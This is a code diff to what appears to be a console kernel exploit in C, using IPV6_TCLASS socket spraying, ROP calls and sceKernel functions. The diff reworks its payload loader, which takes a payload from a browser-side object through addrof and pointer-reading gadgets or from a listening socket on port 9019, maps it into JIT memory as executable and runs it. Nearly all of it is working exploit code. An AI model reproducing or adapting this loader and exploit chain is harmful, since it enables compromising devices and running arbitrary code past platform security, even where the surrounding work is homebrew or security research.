@@ -67,7 +67,10 @@ GET_TCLASS(get_tclass_3)
 int set_tclass(int s, int val)
 {
     if(setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
+    {
+        printf("set_tclass failed on socket %d value 0x%x\n", s, val);
         die();
+    }
 }
 
 #define TCLASS_MASTER 0x13370000
@@ -374,45 +377,122 @@ int jitshm_create(int flags, unsigned long long size, int prot);
 int jitshm_alias(int fd, int prot);
 int dynlib_dlsym(int handle, const char* name, void** ptr);
 
+static void my_memcpy(char* dst, const char* src, size_t sz)
+{
+    while(sz >= 8)
+    {
+        *(uint64_t*)dst = *(uint64_t*)src;
+        dst += 8;
+        src += 8;
+        sz -= 8;
+    }
+    while(sz)
+    {
+        *dst++ = *src++;
+        sz--;
+    }
+}
+
+static void my_rmemcpy(char* dst, const char* src, size_t sz)
+{
+    dst += sz;
+    src += sz;
+    while(sz >= 8)
+    {
+        dst -= 8;
+        src -= 8;
+        sz -= 8;
+        *(uint64_t*)dst = *(uint64_t*)src;
+    }
+    while(sz)
+    {
+        *--dst = *--src;
+        sz--;
+    }
+}
+
+static void my_memzero(char* dst, size_t sz)
+{
+    while(sz >= 8)
+    {
+        *(uint64_t*)dst = 0;
+        dst += 8;
+        sz -= 8;
+    }
+    while(sz)
+    {
+        *dst++ = 0;
+        sz--;
+    }
+}
+
 void load_payload(uint64_t* args)
 {
+    void* payload_addr = (void*)__builtin_gadget_addr("$ window.payload ? read_ptr_at(addrof(window.payload)+16) : 0");
+    size_t payload_len = __builtin_gadget_addr("$ window.payload ? window.payload.length : 0");
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in sin = {
         .sin_family = AF_INET,
         .sin_addr = {.s_addr = 0},
         .sin_port = 0x3b23, //9019
     };
-    if(bind(sock, (void*)&sin, sizeof(sin)) || listen(sock, 1))
-        die();
+    if(!payload_addr)
+    {
+        if(bind(sock, (void*)&sin, sizeof(sin)) || listen(sock, 1))
+            die();
+        void* sceKernelSendNotificationRequest = 0;
+        dynlib_dlsym(0x2001, "sceKernelSendNotificationRequest", &sceKernelSendNotificationRequest);
+        printf("sceKernelSendNotificationRequest = 0x%llx\n", sceKernelSendNotificationRequest);
+        struct {
+            char pad1[0x10];
+            int f1;
+            char pad2[0x19];
+            char msg[0xc03];
+        } notification = { .f1 = -1, .msg = "waiting for payloads" };
+        rop_call_funcptr(sceKernelSendNotificationRequest, 0, &notification, 0xc30, 0);
+        printf("waiting for payload\n");
+    }
     for(;;)
     {
-        int sock2 = accept(sock, NULL, NULL);
-        printf("sock2 = %d\n", sock2);
-        char* mem = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-        size_t cap = 16384;
-        size_t sz = 0;
-        for(;;)
+        char* mem;
+        size_t cap;
+        size_t sz;
+        if(payload_addr)
         {
-            printf("sz = %zu, cap = %zu\n", sz, cap);
-            ssize_t chk = read(sock2, mem+sz, cap-sz);
-            printf("chk = %zd\n", chk);
-            if(chk <= 0)
-                break;
-            sz += chk;
-            if(sz == cap)
-            {
-                printf("moving data... ");
-                size_t cap2 = cap * 2;
-                char* mem2 = mmap(0, cap2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-                for(size_t i = 0; i < sz; i++)
-                    mem2[i] = mem[i];
-                munmap(mem, cap);
-                mem = mem2;
-                cap = cap2;
-                printf("done\n");
-            }
+            cap = ((payload_len-1)|16383)+1;
+            mem = mmap(0, cap, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+            sz = payload_len;
+            my_memcpy(mem, payload_addr, payload_len);
         }
-        close(sock2);
+        else
+        {
+            int sock2 = accept(sock, NULL, NULL);
+            printf("sock2 = %d\n", sock2);
+            mem = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+            cap = 16384;
+            sz = 0;
+            for(;;)
+            {
+                printf("sz = %zu, cap = %zu\n", sz, cap);
+                ssize_t chk = read(sock2, mem+sz, cap-sz);
+                printf("chk = %zd\n", chk);
+                if(chk <= 0)
+                    break;
+                sz += chk;
+                if(sz == cap)
+                {
+                    printf("moving data... ");
+                    size_t cap2 = cap * 2;
+                    char* mem2 = mmap(0, cap2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+                    my_memcpy(mem2, mem, sz);
+                    munmap(mem, cap);
+                    mem = mem2;
+                    cap = cap2;
+                    printf("done\n");
+                }
+            }
+            close(sock2);
+        }
         printf("payload received, mem = 0x%llx, size = %zu\n", mem, sz);
         if(sz < 13 || (uint8_t)mem[0] != 0xeb || (uint8_t)mem[1] != 11 || (uint8_t)mem[2] != 'P' || (uint8_t)mem[3] != 'L' || (uint8_t)mem[4] != 'D')
         {
@@ -435,25 +515,21 @@ void load_payload(uint64_t* args)
         {
             printf("moving data... ");
             char* mem2 = mmap(0, total_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-            for(size_t i = 0; i < sz; i++)
-                mem2[i] = mem[i];
+            my_memcpy(mem2, mem, sz);
             munmap(mem, cap);
             mem = mem2;
             cap = total_size;
             printf("done\n");
         }
-        for(size_t i = sz - 1; i + 1; i--)
-            mem[i + misalignment] = mem[i];
-        for(size_t i = 0; i < misalignment; i++)
-            mem[i] = 0;
+        my_rmemcpy(mem + misalignment, mem, sz);
+        my_memzero(mem, misalignment);
         printf("payload_addr = 0x%llx\n", mem);
         int jit1 = jitshm_create(0, aligned_text_size, PROT_READ|PROT_WRITE|PROT_EXEC);
         int jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
         printf("jit: %d %d\n", jit1, jit2);
         char* jit_shadow = mmap(0, aligned_text_size, PROT_READ|PROT_WRITE, MAP_SHARED, jit2, 0);
         printf("jit_shadow = 0x%llx\n", jit_shadow);
-        for(size_t i = 0; i < aligned_text_size; i++)
-            jit_shadow[i] = mem[i];
+        my_memcpy(jit_shadow, mem, aligned_text_size);
         char* jit_mapping = mmap(mem, aligned_text_size, PROT_READ|PROT_EXEC, MAP_FIXED|MAP_SHARED, jit1, 0);
         printf("jit_mapping = 0x%llx\n", jit_mapping);
         if(jit_mapping != mem)
@@ -461,6 +537,8 @@ void load_payload(uint64_t* args)
         printf("calling payload\n");
         rop_call_funcptr((void(*)(void))(mem+misalignment), args[0], args[1], args[2], args[3], args[4], args[5]);
         printf("payload returned\n");
+        if(payload_addr)
+            return;
     }
 }
 
@@ -599,17 +677,6 @@ int main()
     void* sceKernelDlsym = 0;
     dynlib_dlsym(0x2001, "sceKernelDlsym", &sceKernelDlsym);
     printf("sceKernelDlsym = 0x%llx\n", sceKernelDlsym);
-    void* sceKernelSendNotificationRequest = 0;
-    dynlib_dlsym(0x2001, "sceKernelSendNotificationRequest", &sceKernelSendNotificationRequest);
-    printf("sceKernelSendNotificationRequest = 0x%llx\n", sceKernelSendNotificationRequest);
-    struct {
-        char pad1[0x10];
-        int f1;
-        char pad2[0x19];
-        char msg[0xc03];
-    } notification = { .f1 = -1, .msg = "waiting for payloads" };
-    rop_call_funcptr(sceKernelSendNotificationRequest, 0, &notification, 0xc30, 0);
-    printf("waiting for payload\n");
     uint64_t payload_args[6] = {(uint64_t)sceKernelDlsym, master_sock, victim, ptrs[1], kdata_base};
     load_payload(payload_args);
     return 0;
